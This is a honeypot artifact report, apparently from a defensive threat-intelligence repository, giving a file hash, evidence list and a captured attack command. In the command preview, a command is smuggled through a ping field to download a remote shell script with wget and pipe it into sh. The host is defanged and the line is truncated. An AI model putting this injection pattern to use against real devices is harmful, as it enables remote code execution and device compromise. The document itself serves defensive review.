# 41deccfe23ca86df8e2f1c76c376963a6833947c1e34a5cc41b74043b124b04f

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `41deccfe23ca86df8e2f1c76c376963a6833947c1e34a5cc41b74043b124b04f` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
ping=[internal-ip-redacted]`cd /tmp;wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|sh -s airspan;busybox wget hxxp://91[.]92[.]40[.]XXX/wget.sh -O-|s
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
